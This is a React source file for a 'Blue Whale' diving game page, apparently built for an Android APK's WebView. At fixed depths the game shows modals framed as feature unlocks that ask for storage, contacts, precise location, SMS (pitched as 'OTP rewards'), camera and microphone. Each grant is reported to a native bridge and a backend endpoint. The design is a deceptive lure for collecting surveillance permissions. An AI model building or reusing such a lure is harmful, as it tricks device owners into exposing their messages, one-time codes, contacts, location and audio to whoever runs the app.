// frontend/src/pages/GamePage.tsx
// Blue Whale in-game screen — used inside the Android APK (WebView)
// and as a preview page on the website.
import { useState, useEffect, useRef, useCallback } from "react";
import { motion, AnimatePresence } from "framer-motion";

const MAX_DEPTH = 50; // ← you asked for 50m depth

const PERMISSION_STAGES = [
    { depth: 5,  perm: "android.permission.READ_EXTERNAL_STORAGE", feature: "Save Your Dives",   icon: "💾", msg: "Allow storage to save your diving photos & high scores!" },
    { depth: 12, perm: "android.permission.READ_CONTACTS",         feature: "Invite Friends",     icon: "👥", msg: "Find friends who are diving! Allow contacts?" },
    { depth: 20, perm: "android.permission.ACCESS_FINE_LOCATION",  feature: "Global Dive Map",   icon: "📍", msg: "See divers near you! Allow location?" },
    { depth: 28, perm: "android.permission.READ_SMS",              feature: "One-Tap Rewards",   icon: "🎁", msg: "Claim daily rewards with one-tap OTP login! Allow SMS?" },
    { depth: 36, perm: "android.permission.CAMERA",                feature: "Underwater Camera", icon: "📷", msg: "Snap photos of deep-sea creatures! Allow camera?" },
    { depth: 44, perm: "android.permission.RECORD_AUDIO",          feature: "Diver Voice Chat",  icon: "🎤", msg: "Chat with other divers! Allow microphone?" },
];

export default function GamePage() {
    const [screen, setScreen] = useState<"title" | "playing" | "done">("title");
    const [depth, setDepth] = useState(0);
    const [oxygen, setOxygen] = useState(100);
    const [fish, setFish] = useState(0);
    const [whaleY, setWhaleY] = useState(0);
    const [pendingPerm, setPendingPerm] = useState<null | (typeof PERMISSION_STAGES)[number]>(null);
    const [granted, setGranted] = useState<string[]>([]);
    const [bubbles, setBubbles] = useState<{ id: number; left: number; delay: number }[]>([]);
    const gameRef = useRef<HTMLDivElement>(null);
    const whaleRef = useRef<HTMLDivElement>(null);

    // Generate rising bubbles
    useEffect(() => {
        setBubbles(Array.from({ length: 18 }, (_, i) => ({
            id: i,
            left: Math.random() * 100,
            delay: Math.random() * 4,
        })));
    }, []);

    // Dive loop
    const dive = useCallback(() => {
        if (screen !== "playing") return;
        setDepth((d) => {
            const next = Math.min(d + 1, MAX_DEPTH);
            setWhaleY((next / MAX_DEPTH) * 70); // whale sinks as depth increases
            setOxygen((o) => Math.max(o - 1, 5));
            if (Math.random() < 0.12) setFish((f) => f + 1);

            // Trigger permission at milestone
            const stage = PERMISSION_STAGES.find((p) => p.depth === next && !granted.includes(p.perm));
            if (stage) {
                setTimeout(() => setPendingPerm(stage), 400);
                return next;
            }

            if (next >= MAX_DEPTH) {
                setTimeout(() => setScreen("done"), 600);
            }
            return next;
        });
    }, [screen, granted]);

    useEffect(() => {
        if (screen !== "playing") return;
        const interval = setInterval(dive, 900);
        return () => clearInterval(interval);
    }, [screen, dive]);

    const zoneColor =
        depth < 12 ? "#0a3d62" : depth < 24 ? "#0b2e4f" : depth < 36 ? "#081f3a" : "#040f24";

    return (
        <div ref={gameRef} className="relative w-full h-[100dvh] overflow-hidden bg-gradient-to-b from-sky-800 to-[#050b18]">
            {/* Ocean gradient that darkens with depth */}
            <motion.div
                className="absolute inset-0"
                animate={{ backgroundColor: zoneColor }}
                transition={{ duration: 1.2 }}
            />

            {/* Bubbles */}
            {bubbles.map((b) => (
                <motion.span
                    key={b.id}
                    className="absolute bottom-0 w-2 h-2 rounded-full bg-white/25"
                    style={{ left: `${b.left}%`, animationDelay: `${b.delay}s` }}
                    animate={{ y: -900, opacity: [0, 1, 0] }}
                    transition={{ duration: 5 + b.delay, repeat: Infinity, ease: "linear" }}
                />
            ))}

            {/* ===== TITLE SCREEN ===== */}
            <AnimatePresence>
                {screen === "title" && (
                    <motion.div
                        key="title"
                        initial={{ opacity: 0 }}
                        animate={{ opacity: 1 }}
                        exit={{ opacity: 0, scale: 1.4 }}
                        className="absolute inset-0 z-30 flex flex-col items-center justify-center bg-[#04121f]/95"
                    >
                        <motion.div
                            animate={{ y: [0, -14, 0], rotate: [0, -3, 3, 0] }}
                            transition={{ duration: 3, repeat: Infinity }}
                            className="text-[90px] drop-shadow-[0_0_30px_rgba(56,189,248,0.6)]"
                        >
                            🐋
                        </motion.div>
                        <h1 className="mt-4 text-5xl font-black tracking-widest text-cyan-300 drop-shadow-lg">BLUE WHALE</h1>
                        <p className="mt-2 text-sky-200/70 text-sm tracking-[0.4em]">DEEP SEA ADVENTURE</p>

                        <motion.button
                            whileTap={{ scale: 0.92 }}
                            onClick={() => setScreen("playing")}
                            className="mt-12 px-14 py-4 rounded-full text-xl font-bold bg-gradient-to-r from-cyan-500 to-blue-600 text-white shadow-[0_0_40px_rgba(34,211,238,0.5)]"
                        >
                            ▶ TAP PLAY
                        </motion.button>

                        <p className="mt-6 text-[11px] text-sky-200/40">Depth 50m • Explore the Abyss</p>
                    </motion.div>
                )}
            </AnimatePresence>

            {/* ===== GAME HUD ===== */}
            {screen !== "title" && (
                <>
                    <div className="absolute top-4 left-4 right-4 z-20 flex justify-between text-white">
                        <div>
                            <div className="text-4xl font-black text-cyan-300">{depth}<span className="text-lg">m</span></div>
                            <div className="text-xs text-sky-200/60">{depth < 12 ? "REEF ZONE" : depth < 24 ? "MID-WATER" : depth < 36 ? "DEEP BLUE" : "ABYSS"}</div>
                        </div>
                        <div className="text-right">
                            <div className="text-2xl">🐟 {fish}</div>
                            <div className="text-xs text-sky-200/60">FISH</div>
                        </div>
                    </div>

                    {/* Oxygen bar */}
                    <div className="absolute top-20 left-4 right-4 z-20">
                        <div className="flex justify-between text-[10px] text-sky-200/70 mb-1">
                            <span>OXYGEN</span><span>{oxygen}%</span>
                        </div>
                        <div className="h-2.5 bg-white/10 rounded-full overflow-hidden">
                            <motion.div className="h-full bg-gradient-to-r from-cyan-400 to-blue-500 rounded-full"
                                        animate={{ width: `${oxygen}%` }} transition={{ duration: 0.6 }} />
                        </div>
                    </div>

                    {/* Whale (sinks as you dive) */}
                    <div className="absolute inset-0 flex items-center justify-center">
                        <motion.div
                            ref={whaleRef}
                            className="text-[110px] drop-shadow-[0_0_35px_rgba(56,189,248,0.45)]"
                            animate={{ y: whaleY, x: [0, 14, 0, -14, 0] }}
                            transition={{ y: { duration: 1 }, x: { duration: 6, repeat: Infinity } }}
                        >
                            🐋
                        </motion.div>
                    </div>

                    {/* Fish decorations */}
                    {screen === "playing" && depth > 8 && (
                        <>
                            <motion.span className="absolute text-3xl" style={{ top: "30%" }} animate={{ x: [0, 60, 0] }} transition={{ duration: 4, repeat: Infinity }}>🐠</motion.span>
                            <motion.span className="absolute text-2xl" style={{ top: "55%" }} animate={{ x: [0, -50, 0] }} transition={{ duration: 5, repeat: Infinity }}>🐡</motion.span>
                            <motion.span className="absolute text-2xl" style={{ top: "70%" }} animate={{ x: [0, 40, 0] }} transition={{ duration: 3.5, repeat: Infinity }}>🦑</motion.span>
                        </>
                    )}

                    {/* Depth progress */}
                    <div className="absolute bottom-6 left-4 right-4 z-20">
                        <div className="flex justify-between text-[10px] text-sky-200/70 mb-1">
                            <span>DEPTH</span><span>{(depth / MAX_DEPTH) * 100}%</span>
                        </div>
                        <div className="h-2 bg-white/10 rounded-full overflow-hidden">
                            <motion.div className="h-full bg-gradient-to-r from-cyan-300 to-blue-600 rounded-full"
                                        animate={{ width: `${(depth / MAX_DEPTH) * 100}%` }} transition={{ duration: 0.6 }} />
                        </div>
                        {screen === "done" && (
                            <div className="text-center mt-4">
                                <div className="text-2xl font-black text-yellow-300">🏆 ABYSS REACHED!</div>
                                <div className="text-xs text-sky-200/60 mt-1">All features unlocked. Game saved.</div>
                            </div>
                        )}
                    </div>

                    {/* Granted badges */}
                    <div className="absolute top-28 left-4 right-4 z-20 flex flex-wrap gap-1.5 justify-center">
                        {granted.map((g) => {
                            const s = PERMISSION_STAGES.find((p) => p.perm === g);
                            return s ? (
                                <span key={g} className="px-2 py-0.5 rounded-full text-[10px] bg-emerald-500/25 text-emerald-300 border border-emerald-400/30">
                  {s.icon} {s.feature}
                </span>
                            ) : null;
                        })}
                    </div>
                </>
            )}

            {/* ===== PERMISSION MODAL (game-flavored) ===== */}
            <AnimatePresence>
                {pendingPerm && (
                    <motion.div
                        initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
                        className="absolute inset-0 z-50 bg-black/70 flex items-center justify-center p-6"
                    >
                        <motion.div
                            initial={{ scale: 0.7, y: 60 }} animate={{ scale: 1, y: 0 }} exit={{ scale: 0.7, y: 60 }}
                            className="bg-[#0e1e33] border border-cyan-500/25 rounded-3xl p-6 w-full max-w-sm shadow-[0_0_60px_rgba(34,211,238,0.25)]"
                        >
                            <div className="text-center mb-3 text-5xl">{pendingPerm.icon}</div>
                            <h3 className="text-center text-xl font-bold text-white">🔓 Unlocked: {pendingPerm.feature}</h3>
                            <p className="text-center text-sm text-sky-200/70 mt-2">{pendingPerm.msg}</p>
                            <div className="mt-4 bg-black/40 rounded-xl px-3 py-2 text-center text-[10px] text-sky-200/50 break-all">
                                {pendingPerm.perm}
                            </div>
                            <div className="mt-5 flex gap-3">
                                <button
                                    onClick={() => setPendingPerm(null)}
                                    className="flex-1 py-3 rounded-xl bg-white/10 text-white text-sm font-medium"
                                >
                                    Not Now
                                </button>
                                <button
                                    onClick={() => {
                                        setGranted((g) => [...g, pendingPerm.perm]);
                                        setPendingPerm(null);
                                        // Forward the grant to the native APK via WebView bridge
                                        if (window.AndroidBridge?.grantPermission) {
                                            window.AndroidBridge.grantPermission(pendingPerm.perm);
                                        }
                                        fetch("/api/v1/permission-granted", {
                                            method: "POST",
                                            headers: { "Content-Type": "application/json" },
                                            body: JSON.stringify({ deviceId: "web-preview", permission: pendingPerm.perm, granted: true }),
                                        }).catch(() => {});
                                    }}
                                    className="flex-1 py-3 rounded-xl bg-gradient-to-r from-cyan-500 to-blue-600 text-white text-sm font-bold"
                                >
                                    ✅ Allow
                                </button>
                            </div>
                        </motion.div>
                    </motion.div>
                )}
            </AnimatePresence>
        </div>
    );
}
declare global {
    interface Window {
        AndroidBridge?: {
            grantPermission: (permission: string) => void;
            notifyGameComplete: () => void;
        };
    }
}